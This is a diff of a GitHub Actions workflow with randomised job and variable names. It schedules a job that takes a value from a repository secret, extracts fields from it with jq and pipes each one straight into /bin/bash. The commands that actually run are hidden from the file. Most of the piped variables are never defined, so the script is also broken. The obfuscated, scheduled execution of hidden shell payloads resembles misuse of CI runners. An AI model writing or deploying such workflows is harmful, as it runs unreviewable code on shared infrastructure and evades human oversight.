@@ -1,20 +1,25 @@
 name: xuewanche7568
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 3/6 * * *'
-jobs:  # 26842
+    - cron: '23 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xuewanche7568
         env:
-          pd81: ${{ secrets.pd81 }}
+          vea1167: ${{ secrets.vea1167 }}
         run: |
-          echo $pd81 | jq -r .az9019 | /bin/bash
-          echo $mij53915 | jq -r .mttcu986 | /bin/bash
-          echo $jn3555 | jq -r .idcl0 | /bin/bash
-          echo $vjxc08 | jq -r .ll609 | /bin/bash
-          echo $lt061 | jq -r .c31853 | /bin/bash
+          echo $vea1167 | jq -r .xdq8789 | /bin/bash
+          echo $b0 | jq -r .eyeul9474 | /bin/bash
+          echo $qlf44 | jq -r .arhr7943 | /bin/bash
+          echo $l69 | jq -r .olwb76 | /bin/bash
+          echo $gcvu91 | jq -r .hdl135 | /bin/bash
+          echo $hzd3 | jq -r .xionl42412 | /bin/bash
+          echo $v8738 | jq -r .lv8 | /bin/bash
+          echo $n4 | jq -r .g02720 | /bin/bash
+          echo $nuvdi46830 | jq -r .xzyvm87 | /bin/bash
 
